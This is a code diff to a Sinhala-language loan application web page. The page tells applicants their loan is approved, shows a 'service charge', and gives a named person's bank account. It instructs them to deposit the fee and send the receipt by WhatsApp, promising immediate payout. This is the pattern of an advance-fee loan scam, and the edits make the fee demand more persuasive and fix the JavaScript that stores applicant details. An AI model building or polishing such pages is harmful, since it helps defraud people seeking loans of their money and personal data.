@@ -39,18 +39,18 @@
             <p id="statusSubText" class="center" style="color: #666;">ඔබගේ තොරතුරු පරීක්ෂා කරමින් පවතී. කරුණාකර රැඳී සිටින්න.</p>
             
             <div class="success-box hidden" id="approvedDetails">
-                <h3 style="color: #22543d; margin-top:0; text-align: center;">✅ ණය අනුමත විය!</h3>
+                <h3 style="color: #22543d; margin-top:0; text-align: center;">✅ ණය අයදුම්පත අනුමත කරන ලදී</h3>
                 <div style="background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #c6f6d5; margin-top: 10px;">
                     <p style="margin: 8px 0;"><strong>අනුමත කළ ණය මුදල:</strong> රු. <span id="approvedAmount" style="font-weight: bold; color: #0f4c81; font-size: 18px;"></span>/=</p>
-                    <p style="margin: 8px 0;"><strong>සේවා ගාස්තුව:</strong> රු. <span id="approvedCharge" style="font-weight: bold; color: #c05621; font-size: 18px;"></span>/=</p>
+                    <p style="margin: 8px 0;"><strong>අදාළ සේවා ගාස්තුව:</strong> රු. <span id="approvedCharge" style="font-weight: bold; color: #c05621; font-size: 18px;"></span>/=</p>
                     <hr style="border: 0; border-top: 1px dashed #cbd5e0; margin: 12px 0;">
                     <p style="margin: 6px 0;"><strong>බැංකු ගිණුම් විස්තර (BOC):</strong></p>
                     <p style="margin: 4px 0;">• ගිණුම් අංකය: <span style="font-weight: bold; color: #0f4c81;">89081118</span></p>
                     <p style="margin: 4px 0;">• නම: <span style="font-weight: bold;">I Senanayaka (Nugegoda)</span></p>
                     
-                    <!-- මෙන්න අලුතින් එකතු කළ විස්තර කොටස 👇 -->
+                    <!-- ඉතාමත් සරල සහ පැහැදිලි වචන වලින් යෙදූ දැනුම්දීම 👇 -->
                     <div style="background: #fffaf0; border: 1px solid #feebc8; padding: 12px; border-radius: 6px; margin-top: 12px; font-size: 13px; color: #9c4221; line-height: 1.6;">
-                        📌 <strong>විශේෂ දැනුම්දීමයි:</strong> ඉහත සඳහන් කළ බැංකු ගිණුමට ඔබට ලබාගන්නා මුදලට අදාළ <strong>Service Charge (සේවා ගාස්තුව)</strong> බැංකුගත කර, එහි රිසිට්පත (Receipt) අපගේ <strong>WhatsApp</strong> වෙත එවන්න.
+                        📌 <strong>විශේෂ දැනුම්දීමයි:</strong> ඉහත සඳහන් කළ බැංකු ගිණුමට ඔබගේ <strong>සේවා ගාස්තුව (Service Charge)</strong> බැංකුගත කර (දමා), එහි රිසිට්පත (Receipt) අපගේ <strong>WhatsApp</strong> අංකයට එවන්න. රිසිට්පත ලැබුණු වහාම අපි ඔබගේ ණය මුදල ඔබේ ගිණුමටම එවා එවෙලෙහිම බැංකුගත කරන්නෙමු.
                     </div>
                 </div>
             </div>
@@ -153,7 +153,7 @@
                 address: document.getElementById('address').value,
                 amount: Number(rawAmt).toLocaleString('en-US'),
                 charge: getCharge(rawAmt),
-                bank: document.getElementById('bank.value') || document.getElementById('bank').value,
+                bank: document.getElementById('bank').value,
                 status: 'Pending'
             };
             localStorage.setItem('realCustomerLoan', JSON.stringify(loanData));
